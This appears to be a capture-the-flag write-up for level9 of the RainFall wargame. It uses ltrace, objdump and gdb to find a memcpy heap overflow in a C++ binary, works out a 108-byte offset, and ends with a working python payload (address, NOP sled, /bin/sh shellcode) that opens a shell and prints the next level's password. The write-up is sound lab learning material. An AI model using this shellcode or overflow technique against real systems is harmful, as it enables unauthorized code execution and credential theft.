#
# Documentation level9
#

level9@RainFall:~$ ltrace ./level9 azeaz azeaz
__libc_start_main(0x80485f4, 3, 0xbffff794, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)              = 0
_Znwj(108, 0xbffff794, 0xbffff7a4, 0xb7d79e55, 0xb7fed280)                         = 0x804a008
_Znwj(108, 5, 0xbffff7a4, 0xb7d79e55, 0xb7fed280)                                  = 0x804a078
strlen("azeaz")                                                                    = 5
memcpy(0x0804a00c, "azeaz", 5)                                                     = 0x0804a00c <---- memcpy :)

We try to disas main to see what's happen in this programe ... but no memcpy. But some strange call as 

Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt> <--- new in cpp
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt> <--- new in cpp
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret

   But no trace of memcpy .. so 

level9@RainFall:~$ objdump -d level9
   0804870e <_ZN1N13setAnnotationEPc>:
 804870e:	55                   	push   %ebp
 804870f:	89 e5                	mov    %esp,%ebp
 8048711:	83 ec 18             	sub    $0x18,%esp
 8048714:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048717:	89 04 24             	mov    %eax,(%esp)
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    0x8(%ebp),%edx
 8048722:	83 c2 04             	add    $0x4,%edx
 8048725:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048729:	8b 45 0c             	mov    0xc(%ebp),%eax
 804872c:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048730:	89 14 24             	mov    %edx,(%esp)
 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt> <-- here you are

 So let's try to buffer overflow memcpy:

 --> Find offset thanks to our best friend : https://wiremask.eu/tools/buffer-overflow-pattern-generator/

 (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r
eax            0x41366441	1094083649 <-- "0x41366441" this is our string
ecx            0x67413567	1732326759
edx            0x804a0d4	134521044
ebx            0x804a078	134520952
esp            0xbffff5f0	0xbffff5f0
ebp            0xbffff618	0xbffff618
esi            0x0	0
edi            0x0	0
eip            0x8048682	0x8048682 <main+142>
eflags         0x210287	[ CF PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

Thanks wiremask we find an offset to 108. 


---> Let now try to exec a shell with some shell code in our string. 

1. Get shell code
We'll take shell code of this tutorial : https://beta.hackndo.com/buffer-overflow/
"Rapidement, cette suite d’instruction exécute l’appel système execve en lui passant comme argument la chaine de caractères "/bin/sh", puis fait un appel à l’appel système exit"
Shellcode: "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
"

2. Inject Shell Code

In general, we should have a payload like: [NOPE CODE] + [ShellCode] + [Adresse in Nope zone]

But here: 
  0x0804867c <+136>:   mov    0x10(%esp),%eax <--- breakpoint here
 52    0x08048680 <+140>:   mov    (%eax),%eax
 53    0x08048682 <+142>:   mov    (%eax),%edx
 54    0x08048684 <+144>:   mov    0x14(%esp),%eax
 55    0x08048688 <+148>:   mov    %eax,0x4(%esp)
 56    0x0804868c <+152>:   mov    0x10(%esp),%eax
 57    0x08048690 <+156>:   mov    %eax,(%esp)

Breakpoint 1, 0x0804867c in main ()
(gdb) x/x $eax
0x804a00c:	0x41306141 <- begin on payload
(gdb) ni
0x08048680 in main ()
(gdb) x/x $eax
0x804a078:	0x41366441
(gdb) ni
0x08048682 in main ()
(gdb) x/x $eax
0x41366441:	Cannot access memory at address 0x41366441 <- this is our offset :)

So we know here, we see that it try to acces to our end of payload. 
So let's give an adress wich point on our start of payload:
Oh we juste see before that's here it is : 0x804a00c 

Let's choose an adresse in Nope zone, now : 0x804a010
Because : "(4 bytes after the original EIP address) so it will be 0xbffff77c + 4 , google can simply give you the answer :D" (https://0xrick.github.io/binary-exploitation/bof5/)
Address of Nope zone + Nope code + Shellcode   
       4                 ??         45      

 ?? = 108 - 45 - 4 = 59

 So we'll need to write 59 * '\x90'

 We got our payload: 

 level9@RainFall:~$ ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x90'* 59 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x0c\xa0\x04\x08'"`
$ pwd
/home/user/level9
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

